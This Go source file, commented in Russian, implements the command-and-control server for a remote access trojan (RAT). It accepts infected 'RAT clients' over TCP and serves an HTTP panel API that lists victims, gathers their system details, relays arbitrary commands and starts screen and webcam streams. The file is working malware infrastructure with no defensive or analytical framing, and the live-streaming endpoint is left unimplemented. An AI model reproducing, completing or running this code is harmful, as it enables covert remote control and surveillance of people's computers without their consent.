package main

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"sync"
	"time"
)

// ClientConnection хранит информацию о подключенном клиенте
type ClientConnection struct {
	ID           string
	Connection   net.Conn
	LastActivity time.Time
	Info         map[string]string
	Mutex        sync.Mutex
}

// Command представляет команду, отправляемую клиенту
type Command struct {
	Type    string            `json:"type"`
	Payload map[string]string `json:"payload"`
}

// Response представляет ответ от клиента
type Response struct {
	Status  string            `json:"status"`
	Message string            `json:"message"`
	Data    map[string]string `json:"data"`
}

var (
	clients      = make(map[string]*ClientConnection)
	clientsMutex sync.Mutex
)

func main() {
	// Запускаем TCP сервер для подключения RAT клиентов
	go startTCPServer()
	
	// Запускаем HTTP сервер для API панели управления
	startHTTPServer()
}

func startTCPServer() {
	listener, err := net.Listen("tcp", "0.0.0.0:5555")
	if err != nil {
		log.Fatalf("Ошибка запуска TCP сервера: %v", err)
	}
	defer listener.Close()

	log.Println("TCP сервер запущен на порту 5555")

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Printf("Ошибка принятия соединения: %v", err)
			continue
		}

		// Обрабатываем нового клиента в отдельной горутине
		go handleClient(conn)
	}
}

func handleClient(conn net.Conn) {
	clientID := generateClientID()
	log.Printf("Новый клиент подключен: %s", clientID)

	client := &ClientConnection{
		ID:           clientID,
		Connection:   conn,
		LastActivity: time.Now(),
		Info:         make(map[string]string),
		Mutex:        sync.Mutex{},
	}

	// Регистрируем клиента в глобальной карте
	clientsMutex.Lock()
	clients[clientID] = client
	clientsMutex.Unlock()

	// Отправляем команду для получения информации о системе
	sendCommand(client, Command{
		Type: "get_system_info",
		Payload: map[string]string{},
	})

	defer func() {
		conn.Close()
		clientsMutex.Lock()
		delete(clients, clientID)
		clientsMutex.Unlock()
		log.Printf("Клиент отключен: %s", clientID)
	}()

	buffer := make([]byte, 4096)
	for {
		n, err := conn.Read(buffer)
		if err != nil {
			if err != io.EOF {
				log.Printf("Ошибка чтения от клиента %s: %v", clientID, err)
			}
			break
		}

		client.LastActivity = time.Now()
		
		// Обрабатываем полученные данные
		handleClientData(client, buffer[:n])
	}
}

func handleClientData(client *ClientConnection, data []byte) {
	var response Response
	err := json.Unmarshal(data, &response)
	if err != nil {
		log.Printf("Ошибка десериализации ответа от %s: %v", client.ID, err)
		return
	}

	// Обрабатываем различные типы ответов
	switch response.Status {
	case "system_info":
		client.Mutex.Lock()
		for key, value := range response.Data {
			client.Info[key] = value
		}
		client.Mutex.Unlock()
		log.Printf("Получена информация о системе клиента %s: %v", client.ID, response.Data)
	case "command_result":
		log.Printf("Результат выполнения команды от %s: %s", client.ID, response.Message)
	case "stream_data":
		// Здесь будет обработка потоковых данных (скриншоты, видео и т.д.)
		log.Printf("Получены потоковые данные от %s", client.ID)
	default:
		log.Printf("Получен неизвестный тип ответа от %s: %s", client.ID, response.Status)
	}
}

func sendCommand(client *ClientConnection, cmd Command) error {
	cmdBytes, err := json.Marshal(cmd)
	if err != nil {
		return fmt.Errorf("ошибка сериализации команды: %v", err)
	}

	client.Mutex.Lock()
	defer client.Mutex.Unlock()

	_, err = client.Connection.Write(cmdBytes)
	if err != nil {
		return fmt.Errorf("ошибка отправки команды: %v", err)
	}

	return nil
}

func generateClientID() string {
	return fmt.Sprintf("%d", time.Now().UnixNano())
}

// HTTP API для управления клиентами через панель управления
func startHTTPServer() {
	http.HandleFunc("/api/clients", getClients)
	http.HandleFunc("/api/client/", getClientInfo)
	http.HandleFunc("/api/command", sendClientCommand)
	http.HandleFunc("/api/stream", handleStream)

	log.Println("HTTP API сервер запущен на порту 8080")
	log.Fatal(http.ListenAndServe("0.0.0.0:8080", nil))
}

// API для получения списка подключенных клиентов
func getClients(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Метод не поддерживается", http.StatusMethodNotAllowed)
		return
	}

	clientList := make([]map[string]string, 0)
	clientsMutex.Lock()
	defer clientsMutex.Unlock()

	for id, client := range clients {
		clientInfo := map[string]string{
			"id":           id,
			"last_active":  client.LastActivity.Format(time.RFC3339),
			"connected_at": client.LastActivity.Format(time.RFC3339),
		}
		
		client.Mutex.Lock()
		for key, value := range client.Info {
			clientInfo[key] = value
		}
		client.Mutex.Unlock()
		
		clientList = append(clientList, clientInfo)
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(clientList)
}

// API для получения информации о конкретном клиенте
func getClientInfo(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Метод не поддерживается", http.StatusMethodNotAllowed)
		return
	}

	clientID := r.URL.Path[len("/api/client/"):]
	
	clientsMutex.Lock()
	client, exists := clients[clientID]
	clientsMutex.Unlock()
	
	if !exists {
		http.Error(w, "Клиент не найден", http.StatusNotFound)
		return
	}

	clientInfo := map[string]string{
		"id":           clientID,
		"last_active":  client.LastActivity.Format(time.RFC3339),
		"connected_at": client.LastActivity.Format(time.RFC3339),
	}
	
	client.Mutex.Lock()
	for key, value := range client.Info {
		clientInfo[key] = value
	}
	client.Mutex.Unlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(clientInfo)
}

// API для отправки команд клиенту
func sendClientCommand(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Метод не поддерживается", http.StatusMethodNotAllowed)
		return
	}

	var requestData struct {
		ClientID string            `json:"client_id"`
		Type     string            `json:"type"`
		Payload  map[string]string `json:"payload"`
	}

	if err := json.NewDecoder(r.Body).Decode(&requestData); err != nil {
		http.Error(w, "Неверный формат запроса", http.StatusBadRequest)
		return
	}

	clientsMutex.Lock()
	client, exists := clients[requestData.ClientID]
	clientsMutex.Unlock()

	if !exists {
		http.Error(w, "Клиент не найден", http.StatusNotFound)
		return
	}

	command := Command{
		Type:    requestData.Type,
		Payload: requestData.Payload,
	}

	err := sendCommand(client, command)
	if err != nil {
		http.Error(w, fmt.Sprintf("Ошибка отправки команды: %v", err), http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"status": "success"})
}

// API для стриминга (изображения экрана, веб-камеры)
func handleStream(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost && r.Method != http.MethodGet {
		http.Error(w, "Метод не поддерживается", http.StatusMethodNotAllowed)
		return
	}

	clientID := r.URL.Query().Get("client_id")
	streamType := r.URL.Query().Get("type") // "screen", "webcam", etc.

	clientsMutex.Lock()
	client, exists := clients[clientID]
	clientsMutex.Unlock()

	if !exists {
		http.Error(w, "Клиент не найден", http.StatusNotFound)
		return
	}

	if r.Method == http.MethodPost {
		// Начать стрим
		command := Command{
			Type: "start_stream",
			Payload: map[string]string{
				"type": streamType,
			},
		}

		err := sendCommand(client, command)
		if err != nil {
			http.Error(w, fmt.Sprintf("Ошибка отправки команды: %v", err), http.StatusInternalServerError)
			return
		}

		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]string{"status": "stream_started"})
	} else {
		// Получить последний кадр стрима или установить WebSocket соединение для живого стрима
		// Здесь должна быть реализация WebSocket для живого стрима
		http.Error(w, "Не реализовано", http.StatusNotImplemented)
	}
} 